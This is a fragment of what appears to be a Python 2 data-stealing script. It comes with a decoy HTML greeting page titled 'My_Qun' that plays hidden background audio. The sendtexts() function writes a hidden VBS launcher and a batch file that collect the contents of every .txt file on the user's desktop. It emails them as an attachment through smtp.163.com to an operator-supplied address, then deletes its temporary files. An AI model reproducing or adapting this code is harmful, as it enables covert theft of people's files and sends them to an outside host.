...
import time
def sendtexts():
	os.system('echo set a=createobject("wscript.shell")>>e:\\wocao.vbs')
	os.system('echo a.run "e:\\ss.bat",vbhide>>e:\\wocao.vbs')#vbs use bat
	#os.system('echo a.run "cmd /c cd /d %userprofile%\desktop & type *.txt>>e:\\wo.txt",vbhide>>e:\\wocao.vbs')
	fx = open('e:\\ss.bat','a')
	bat = """
	@echo off
	cd /d %userprofile%\desktop
	dir /s /b *.txt>>e:\woshishei.txt
	for /f "delims=" %%i in (e:\\woshishei.txt) do (type %%i>>e:\desktop.txt)
	del e:\woshishei.txt
	"""
	fx.write(str(bat))	
	fx.close()
	os.system("e:\\wocao.vbs")
	time.sleep(1)
	msg = email.mime.multipart.MIMEMultipart()
	msg['Subject'] = u'我是谁'
	msg['From'] = ''#user
	msg['To'] = ''#your email
	att = MIMEText(open('e:\\desktop.txt','rb').read(),'base64','utf-8')
	att["Content-Type"] = 'application/octet-stream'
	att["Content-Disposition"] = 'attachment;filename="e:\\desktop.txt"'
	msg.attach(att)
	try:
		smtp = smtplib.SMTP()
		smtp.connect('smtp.163.com','25')
		smtp.login('','')#you email and password
		msg = msg.as_string()
		smtp.sendmail('',[''],msg)#your email and want to post
		smtp.quit()
	except Exception as e:
		print e
	os.system("del e:\\ss.bat")
	os.system("del e:\\wocao.vbs")
	os.system("del e:\\desktop.txt")
	os.system("del e:\\woshishei.txt")
	
def html():
	m="""<html><head><title>My_Qun</title><meta charset="gb2312"><style type="text/css"> 
	* {
		margin: 0; 
		padding: 0;
...
<div id="container">
	...
	<div>
	<h1 id="h1">May you better memories</h1>
	<h2 id="h2">Wish us a better future</h2>
	<h3 id="h3">&nbsp; </h3>
	<h3> </h3>
	<h3 id="h3">&nbsp; </h3>
	<h3>  </h3>
...
<embed src="http://www.kuwo.cn/my/4251679/" width=0 height=0 type=audio/mpeg loop="true"  
<head><bgsound src="http://www.dj92cc.com/p135326.html" loop="-1"></head>
        </script>
<script> 
